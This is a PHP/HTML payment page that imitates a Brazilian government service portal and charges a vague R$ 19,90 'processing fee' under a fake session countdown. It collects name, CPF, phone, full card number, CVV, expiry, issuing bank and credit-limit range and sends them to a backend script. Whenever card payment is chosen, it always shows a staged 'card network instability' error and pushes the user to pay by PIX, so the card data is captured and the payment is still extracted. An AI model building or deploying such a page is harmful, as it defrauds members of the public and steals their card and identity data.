<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$dados = $_SESSION['dados_cadastro'] ?? [];
$nome  = $dados['nome'] ?? '';
$cpf   = $dados['cpf'] ?? '';
$tel   = $dados['telefone'] ?? '';
$servico = $dados['servico'] ?? 'Atendimento Geral';
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento Seguro - Portal de Atendimento</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .bg-gov-header { background-color: #0c326f; }
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translateY(10px); }
            15% { opacity: 1; transform: translateY(0); }
            85% { opacity: 1; transform: translateY(0); }
            100% { opacity: 0; transform: translateY(10px); }
        }
        .toast-notification {
            animation: fadeInOut 5s ease-in-out infinite;
        }
    </style>
</head>
<body class="bg-slate-100 min-h-screen font-sans flex flex-col justify-between">

    <div>
        <header class="bg-gov-header text-white text-xs py-2.5 px-4 shadow-sm">
            <div class="max-w-2xl mx-auto flex justify-between items-center">
                <span class="font-bold tracking-wide">Portal de Atendimento Digital</span>
                <span class="text-emerald-400 flex items-center gap-1"><i class="fa-solid fa-lock text-[10px]"></i> Pagamento 100% Seguro</span>
            </div>
        </header>

        <div class="w-full bg-[#1351b4] shadow-md overflow-hidden">
            <img src="https://cdn.discordapp.com/attachments/1511895735707373572/1534046928093057145/IMG_0804.png?ex=6a72b408&is=6a716288&hm=1153c667b8fe2d361b7989e662fd567c348915a20cc38b4e440dc81b0f2c492b" alt="Banner do Portal" class="w-full h-36 sm:h-48 md:h-56 object-cover object-center block">
        </div>

        <main class="max-w-lg mx-auto px-4 py-6">
            <div class="bg-amber-50 border border-amber-200 rounded-xl p-3 mb-4 flex items-center justify-between text-amber-800 shadow-sm">
                <div class="flex items-center gap-2">
                    <i class="fa-regular fa-clock text-amber-600 animate-pulse"></i>
                    <span class="text-xs font-semibold">Sua sessão expira em:</span>
                </div>
                <span id="countdown-timer" class="text-xs font-extrabold bg-amber-200/60 px-2.5 py-1 rounded-md text-amber-900 font-mono">14:59</span>
            </div>

            <div class="bg-white rounded-2xl shadow-lg border border-slate-200 p-6 md:p-8">
                <div class="mb-5 pb-4 border-b border-slate-100 flex items-center justify-between text-[11px]">
                    <div class="flex items-center gap-1.5 text-emerald-600 font-bold">
                        <i class="fa-solid fa-circle-check"></i> 1. Dados Validados
                    </div>
                    <div class="h-[1px] flex-1 bg-slate-200 mx-3"></div>
                    <div class="flex items-center gap-1.5 text-blue-600 font-bold">
                        <i class="fa-solid fa-spinner animate-spin"></i> 2. Pagamento
                    </div>
                </div>

                <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 text-center mb-6">
                    <span class="text-[11px] font-bold text-slate-400 uppercase tracking-wider block mb-1">Taxa de Processamento Operacional</span>
                    <span class="text-3xl font-extrabold text-slate-900 tracking-tight">R$ 19,90</span>
                </div>

                <div class="mb-5">
                    <label class="block text-xs font-bold text-slate-700 mb-2 uppercase tracking-wide">Forma de Pagamento</label>
                    <div class="grid grid-cols-2 gap-3">
                        <button type="button" id="btn-method-pix" onclick="selectPaymentMethod('pix')" class="flex items-center justify-center gap-2 py-3 px-4 bg-blue-50 border-2 border-blue-600 rounded-xl text-xs font-bold text-blue-900 transition">
                            <i class="fa-solid fa-qrcode text-blue-600"></i> PIX (Instantâneo)
                        </button>
                        <button type="button" id="btn-method-card" onclick="selectPaymentMethod('card')" class="flex items-center justify-center gap-2 py-3 px-4 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-500 hover:bg-slate-100 transition">
                            <i class="fa-regular fa-credit-card"></i> Cartão de Crédito
                        </button>
                    </div>
                </div>

                <form id="form-identificacao" class="space-y-4">
                    <input type="hidden" name="payment_method" id="input-payment-method" value="pix">
                    <input type="hidden" name="servico" id="input-servico-hidden" value="<?php echo htmlspecialchars($servico); ?>">

                    <div>
                        <label class="block text-xs font-bold text-slate-700 mb-1 uppercase tracking-wide">Nome Completo</label>
                        <input type="text" name="nome" value="<?php echo htmlspecialchars($nome); ?>" required placeholder="Digite seu nome" class="w-full px-3.5 py-2.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-600 transition">
                    </div>

                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
                        <div>
                            <label class="block text-xs font-bold text-slate-700 mb-1 uppercase tracking-wide">CPF</label>
                            <input type="text" name="cpf" id="cpf-input" value="<?php echo htmlspecialchars($cpf); ?>" required placeholder="000.000.000-00" class="w-full px-3.5 py-2.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-600 transition">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-700 mb-1 uppercase tracking-wide">Celular / WhatsApp</label>
                            <input type="text" name="telefone" id="phone-input" value="<?php echo htmlspecialchars($tel); ?>" required placeholder="(00) 00000-0000" class="w-full px-3.5 py-2.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-600 transition">
                        </div>
                    </div>

                    <!-- Campos Exclusivos para Cartão -->
                    <div id="card-fields" class="space-y-3 pt-2 border-t border-slate-100 hidden">
                        <div class="flex justify-between items-center">
                            <h4 class="text-xs font-bold text-slate-700 uppercase tracking-wide">Dados do Cartão</h4>
                            <div class="flex gap-1.5 text-slate-400 text-sm">
                                <i class="fa-brands fa-cc-visa"></i>
                                <i class="fa-brands fa-cc-mastercard"></i>
                                <i class="fa-brands fa-cc-amex"></i>
                            </div>
                        </div>
                        
                        <div>
                            <label class="block text-[11px] font-bold text-slate-600 mb-1">Número do Cartão</label>
                            <div class="relative">
                                <input type="text" name="card_number" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" class="w-full pl-3.5 pr-10 py-2.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-600">
                                <div id="card-brand-icon" class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 text-base">
                                    <i class="fa-regular fa-credit-card"></i>
                                </div>
                            </div>
                        </div>

                        <div>
                            <label class="block text-[11px] font-bold text-slate-600 mb-1">Nome no Cartão</label>
                            <input type="text" name="card_holder" placeholder="NOME DO TITULAR" class="w-full px-3.5 py-2.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-800 uppercase focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-600">
                        </div>

                        <div class="grid grid-cols-3 gap-2">
                            <div>
                                <label class="block text-[11px] font-bold text-slate-600 mb-1">Validade</label>
                                <input type="text" name="card_expiration" id="card-exp" placeholder="MM/AA" maxlength="5" class="w-full px-3.5 py-2.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-600">
                            </div>
                            <div>
                                <label class="block text-[11px] font-bold text-slate-600 mb-1">CVV</label>
                                <input type="text" name="card_cvv" id="card-cvv" placeholder="123" maxlength="4" class="w-full px-3.5 py-2.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-600">
                            </div>
                            <div>
                                <label class="block text-[11px] font-bold text-slate-600 mb-1">Tipo</label>
                                <select name="card_type" class="w-full px-2 py-2.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-600">
                                    <option value="credito">Crédito</option>
                                    <option value="debito">Débito</option>
                                </select>
                            </div>
                        </div>

                        <!-- Banco e Faixa de Limite DENTRO do form -->
                        <div class="grid grid-cols-2 gap-3 pt-1">
                            <div>
                                <label class="block text-[11px] font-bold text-slate-600 mb-1">Banco Emissor</label>
                                <select name="card_bank" class="w-full px-2 py-2.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-600">
                                    <option value="nubank">Nubank</option>
                                    <option value="itau">Itaú</option>
                                    <option value="bradesco">Bradesco</option>
                                    <option value="santander">Santander</option>
                                    <option value="caixa">Caixa Econômica</option>
                                    <option value="banco do brasil">Banco do Brasil</option>
                                    <option value="outro">Outro / Outros Bancos</option>
                                </select>
                            </div>
                            <div>
                                <label class="block text-[11px] font-bold text-slate-600 mb-1">Faixa de Limite</label>
                                <select name="card_limit_range" class="w-full px-2 py-2.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-600">
                                    <option value="limite baixo">Até R$ 1.000</option>
                                    <option value="limite medio">R$ 1.000 a R$ 5.000</option>
                                    <option value="limite alto">Acima de R$ 5.000</option>
                                </select>
                            </div>
                        </div>
                    </div>

                    <div class="pt-3">
                        <button type="submit" id="btn-submit" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-4 px-4 rounded-xl text-sm shadow-md transition flex items-center justify-center gap-2">
                            <i class="fa-solid fa-lock text-xs"></i>
                            <span id="btn-submit-text">Gerar Pagamento PIX com Segurança</span>
                        </button>
                    </div>
                </form>
            </div>
        </main>
    </div>

    <!-- Modal de Carregamento -->
    <div id="loading-modal" class="fixed inset-0 bg-black/60 z-50 flex flex-col items-center justify-center p-6 hidden">
        <div class="bg-white rounded-2xl p-6 text-center shadow-xl w-full max-w-xs flex flex-col items-center">
            <div id="modal-spinner" class="w-12 h-12 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mb-4"></div>
            <div id="modal-icon-error" class="text-amber-500 text-4xl mb-2 hidden"><i class="fa-solid fa-triangle-exclamation"></i></div>
            <h4 class="font-bold text-gray-800 text-sm" id="loading-title">Processando...</h4>
            <p class="text-xs text-gray-500 mt-2 leading-relaxed" id="loading-sub">Aguarde um instante.</p>
            <button id="btn-modal-close" onclick="redirectPixAfterCard()" class="mt-4 bg-blue-600 text-white text-xs font-bold py-2 px-4 rounded-lg hidden w-full">Pagar via PIX</button>
        </div>
    </div>

    <script>
    let currentMethod = 'pix';
    let savedPixData = null;

    function selectPaymentMethod(method) {
        currentMethod = method;
        document.getElementById('input-payment-method').value = method;

        const btnPix = document.getElementById('btn-method-pix');
        const btnCard = document.getElementById('btn-method-card');
        const cardFields = document.getElementById('card-fields');
        const btnSubmitText = document.getElementById('btn-submit-text');

        if (method === 'pix') {
            btnPix.className = "flex items-center justify-center gap-2 py-3 px-4 bg-blue-50 border-2 border-blue-600 rounded-xl text-xs font-bold text-blue-900 transition";
            btnCard.className = "flex items-center justify-center gap-2 py-3 px-4 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-500 hover:bg-slate-100 transition";
            cardFields.classList.add('hidden');
            btnSubmitText.innerText = 'Gerar Pagamento PIX com Segurança';
        } else {
            btnCard.className = "flex items-center justify-center gap-2 py-3 px-4 bg-blue-50 border-2 border-blue-600 rounded-xl text-xs font-bold text-blue-900 transition";
            btnPix.className = "flex items-center justify-center gap-2 py-3 px-4 bg-slate-50 border border-slate-200 rounded-xl text-xs font-medium text-slate-500 hover:bg-slate-100 transition";
            cardFields.classList.remove('hidden');
            btnSubmitText.innerText = 'Finalizar Pagamento no Cartão';
        }
    }

    function redirectPixAfterCard() {
        if (savedPixData && savedPixData.pix_code) {
            let cleanPix = savedPixData.pix_code.replace(/\\/g, '');
            localStorage.setItem('current_pix_code', cleanPix);
            localStorage.setItem('current_pedido_id', savedPixData.pedidoId);
            localStorage.setItem('current_amount', '19.90');
            window.location.href = 'qrcode.php';
        } else {
            document.getElementById('loading-modal').classList.add('hidden');
            selectPaymentMethod('pix');
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        const form = document.getElementById('form-identificacao');
        const loadingModal = document.getElementById('loading-modal');

        if (form) {
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                document.getElementById('loading-title').innerText = currentMethod === 'card' ? 'Verificando Operadora...' : 'Gerando seu PIX';
                document.getElementById('loading-sub').innerText = 'Aguarde um instante...';
                document.getElementById('modal-spinner').classList.remove('hidden');
                document.getElementById('modal-icon-error').classList.add('hidden');
                document.getElementById('btn-modal-close').classList.add('hidden');
                loadingModal.classList.remove('hidden');

                const formData = new FormData(form);
                const dataObj = {};
                formData.forEach((value, key) => dataObj[key] = value);

                try {
                    const response = await fetch('api/create_payment.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(dataObj)
                    });

                    const result = await response.json();

                    if (response.ok && result.status === 'success') {
                        savedPixData = result;

                        if (currentMethod === 'card') {
                            setTimeout(() => {
                                document.getElementById('modal-spinner').classList.add('hidden');
                                document.getElementById('modal-icon-error').classList.remove('hidden');
                                document.getElementById('loading-title').innerText = 'Instabilidade no Cartão';
                                document.getElementById('loading-sub').innerText = 'Identificamos uma oscilação na rede de cartões. Para não perder o atendimento, conclua via PIX.';
                                document.getElementById('btn-modal-close').classList.remove('hidden');
                            }, 2000);
                        } else {
                            let cleanPix = result.pix_code.replace(/\\/g, '');
                            localStorage.setItem('current_pix_code', cleanPix);
                            localStorage.setItem('current_pedido_id', result.pedidoId);
                            localStorage.setItem('current_amount', '19.90');
                            window.location.href = 'qrcode.php';
                        }
                    } else {
                        loadingModal.classList.add('hidden');
                        alert('Erro ao processar requisição: ' + (result.message || 'Tente novamente.'));
                    }
                } catch (error) {
                    loadingModal.classList.add('hidden');
                    alert('Erro na comunicação com o servidor.');
                }
            });
        }
    });
    </script>
</body>
</html>